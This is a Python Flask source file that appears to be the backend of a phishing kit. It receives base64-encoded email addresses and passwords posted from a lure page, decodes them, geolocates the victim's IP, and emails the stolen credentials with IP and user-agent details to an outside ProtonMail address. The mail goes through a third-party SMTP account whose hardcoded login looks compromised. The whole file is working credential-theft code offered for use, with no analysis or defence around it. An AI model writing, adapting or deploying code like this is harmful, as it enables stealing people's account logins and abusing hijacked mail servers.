import email, smtplib, ssl
import base64 
import geoip2.database
import json
import requests
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from flask import Flask, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

geoip_database_path = "GeoLite2-City.mmdb"
@app.route('/', methods=['POST', 'GET'])


def index():
   if request.method == 'POST':
    def decode(post_value):
        base64_string = post_value
        base64_bytes = base64_string.encode("ascii") 
        sample_string_bytes = base64.b64decode(base64_bytes) 
        sample_string = sample_string_bytes.decode("ascii")
        decoded_value = str(sample_string)
        return decoded_value
    
    def ip_location(ip):
         with geoip2.database.Reader(geoip_database_path) as reader:
            response = reader.city(ip)
            country = response.country.name
            return country
    
    def mww():
        subject = country + " | " + pg + " | " + ip
        body = "--------------" + pg + " Receipt Info" + "---------------\n" + "Email Address            : " + ai + "\nPassword           : " + pr + "\n|--------------- I N F O | I P -------------------|\n|Client IP: " + ip + "\nUser Agent : " + useragent + "\n|----------- unknown --------------|"
        sender_email = "accounts@mmolokimedlabs.co.bw"  
        receiver_email = "Boss <topcaliphate@proton.me>" 
        password = "Accountant1986"


        message = MIMEMultipart()
        message["From"] = "CKSoftwares System <system@cksoftwares.com>"
        message["To"] = receiver_email
        message["Subject"] = subject


        message.attach(MIMEText(body, "plain"))
        text = message.as_string()


        context = ssl.create_default_context()
        with smtplib.SMTP_SSL("mail.mmolokimedlabs.co.bw", 465, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, text)
    
    ax = request.form.get('ai')
    px = request.form.get('pr')
    pgx = request.form.get('pg')
    ipx = request.headers.getlist("X-Forwarded-For")[0]
    ip = ipx.split(',')[0]
    country=ip_location(ip)
    useragent = request.headers.get('User-Agent')
    if ax is not None or px is not None:
        ai = str(decode(ax))
        pr = str(decode(px))
        pg = str(decode(pgx))
        mww()
        return 'Priest(8)'
   else:
      return 'Priest(e)'

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=8000)
